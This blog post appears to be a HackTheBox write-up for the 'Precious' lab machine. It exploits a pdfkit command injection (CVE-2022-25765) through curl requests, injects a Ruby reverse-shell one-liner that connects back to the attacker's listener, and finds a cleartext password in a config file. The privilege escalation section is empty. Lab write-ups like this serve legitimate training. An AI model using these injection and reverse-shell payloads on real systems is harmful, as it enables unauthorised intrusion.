---
layout: post
title: Precious
date: 2025-02-9 14:03 +0100
author: lone
description:
image:
category: HackTheBox
tags: htb box writeup
published: true
sitemap: false
---

## Inital access

```bash
nmap -T4 -p- -min-parallelism 40 10.10.11.XXX
```
![Nmap Scan TCP](/assets/img/precious/scantcp.png)

```bash
echo "10.10.11.XXX precious.htb" | sudo tee -a /etc/hosts
```

Let's take a look at the website.

![Precious Website](/assets/img/precious/website.png)

It looks like you can convert web pages to pdf, but the machine only seems to have access to the internal network. Let's host a web page quickly to analyze the pdf.

```bash
exiftool u3oysnv[...]d00u0qq.pdf

ExifTool Version Number         : 12.76
[...]
Creator                         : Generated by pdfkit v0.8.6
```
pdfkit v0.8.6 seems to be vulnerable to a command injection ([CVE-2022-25765](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795)) 
Let's try it out this payload

`http://10.10.XX.XX:80/?name=%20\`whoami\``

We URL Encode it before sending it
```bash
curl 'http://precious.htb' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'url=http%3A%2F%2F10.10.XX.XX%3A80%2F%3Fname%3D%2520%60whoami%60'
```

And we receive a response on our server :

```bash
10.10.11.XXX - - [XX/XX/XX XX:XX:XX] "GET /?name=%20ruby HTTP/1.1" 200 -
```

Time to craft ourselves a reverse shell ! 
Let's setup a listenner :
```bash
pwncat-cs -p 6667
```

```ruby
ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.XX.XX",1234))'
```

We replace whoami by this new payload
```bash
curl 'http://precious.htb' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d "url=http://10.10.XX.XX/?name=%2520%60ruby%20-rsocket%20-e'spawn(%22sh%22,%5B:in,:out,:err%5D=%3ETCPSocket.new(%2210.10.XX.XX%22,XXXX))'%60"
```

![Reverse Shell](/assets/img/precious/reverseshell.png)

There is a .bundle in the home directory of our user ruby. Let's investigate :

![Ruby Conf file](/assets/img/precious/rubypivottohenry.png)

Clear text password for the user henry ! And with this we got our first flag :

![First Flag](/assets/img/precious/henryflag.png)

## Privilege escalation

